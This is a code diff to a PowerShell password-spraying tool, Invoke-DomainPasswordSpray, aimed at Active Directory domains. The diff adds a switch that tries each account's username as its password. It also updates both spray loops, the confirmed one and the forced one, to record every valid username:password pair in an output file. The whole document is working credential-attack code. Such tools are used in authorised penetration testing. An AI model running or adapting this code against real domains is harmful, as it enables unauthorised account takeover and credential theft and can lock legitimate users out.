@@ -25,6 +25,10 @@ function Invoke-DomainPasswordSpray{
     .PARAMETER PasswordList
 
     A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
+	    
+	.PARAMETER UsernameAsPassword
+    
+    For each user, will try that user's name as their password
 
     .PARAMETER OutFile
 
@@ -54,6 +58,13 @@ function Invoke-DomainPasswordSpray{
     -----------
     This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
 
+	.EXAMPLE
+
+    C:\PS> Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt
+
+    Description
+    -----------
+    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt
 
     #>
     Param(
@@ -69,18 +80,23 @@ function Invoke-DomainPasswordSpray{
      [Parameter(Position = 2, Mandatory = $false)]
      [string]
      $PasswordList,
-
-     [Parameter(Position = 3, Mandatory = $false)]
-     [string]
-     $OutFile,
+	 
+	 [Parameter(Position = 3, Mandatory = $false)]
+     [switch]     
+     $UsernameAsPassword,
 
      [Parameter(Position = 4, Mandatory = $false)]
      [string]
-     $Domain = "",
+     $OutFile,
 
      [Parameter(Position = 5, Mandatory = $false)]
+     [string]
+     $Domain = "",
+
+     [Parameter(Position = 6, Mandatory = $false)]
      [switch]     
      $Force
+	 
     )
     
     if ($Domain -ne "")
@@ -134,57 +150,67 @@ function Invoke-DomainPasswordSpray{
     
     }
 
-    # If a single password is selected do this
-    if ($Password)
+    # If a single password or UsernameAsPassword is selected do this
+    if ($Password -Or $UsernameAsPassword)
     {
         #if no force flag is set we will ask if the user is sure they want to spray
         if (!$Force)
         {
-        $title = "Confirm Password Spray"
-        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
+			$title = "Confirm Password Spray"
+			$message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
 
-        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-            "Attempts to authenticate 1 time per user in the list."
+			$yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
+				"Attempts to authenticate 1 time per user in the list."
 
-        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
-            "Cancels the password spray."
+			$no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
+				"Cancels the password spray."
 
-        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
+			$options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
 
-        $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
+			$result = $host.ui.PromptForChoice($title, $message, $options, 0) 
 
-        switch ($result)
-            {
-                0 
-                {
-                    $time = Get-Date
-                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
-                    Write-Host "[*] This might take a while depending on the total number of users"
-                    $curr_user = 0
-                    $count = $UserListArray.count
-
-                    ForEach($User in $UserListArray){
-                    $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
-                        If ($Domain_check.name -ne $null)
-                        {
-                            if ($OutFile -ne "")
-                            {    
-                                Add-Content $OutFile $User`:$Password
-                            }
-                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
-                        }
-                        $curr_user+=1 
-                        Write-Host -nonewline "$curr_user of $count users tested`r"
-                        }
-                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-                    if ($OutFile -ne "")
-                    {
-                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-                    }
-                
-                }
-                1 {"Cancelling the password spray."}
-            }
+			switch ($result)
+				{
+					0 
+					{
+						$time = Get-Date
+						Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
+						Write-Host "[*] This might take a while depending on the total number of users"
+						$curr_user = 0
+						$count = $UserListArray.count
+						$curr_password = ""
+						ForEach($User in $UserListArray){
+							
+							if( $Password )
+							{
+								$curr_password = $Password
+							}
+							else
+							{
+								$curr_password = $User
+							}
+							
+							$Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$curr_password)
+							if ($Domain_check.name -ne $null)
+							{
+								if ($OutFile -ne "")
+								{    
+									Add-Content $OutFile $User`:$curr_password
+								}
+							Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$curr_password"
+							}
+							$curr_user+=1 
+							Write-Host -nonewline "$curr_user of $count users tested`r"
+						}
+						Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+						if ($OutFile -ne "")
+						{
+						Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+						}
+					
+					}
+					1 {"Cancelling the password spray."}
+				}
         }
         #If the force flag is set don't bother asking if we are sure we want to spray.
         if ($Force)
@@ -195,15 +221,26 @@ function Invoke-DomainPasswordSpray{
         $curr_user = 0
         $count = $UserListArray.count
 
+		$curr_password = ""
         ForEach($User in $UserListArray){
-        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+		
+		if( $Password )
+		{
+			$curr_password = $Password
+		}
+		else
+		{
+			$curr_password = $User
+		}
+		
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$curr_password)
             If ($Domain_check.name -ne $null)
             {
                 if ($OutFile -ne "")
                 {    
-                    Add-Content $OutFile $User`:$Password
+                    Add-Content $OutFile $User`:$curr_password
                 }
-            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$curr_password"
             }
             $curr_user+=1 
             Write-Host -nonewline "$curr_user of $count users tested`r"
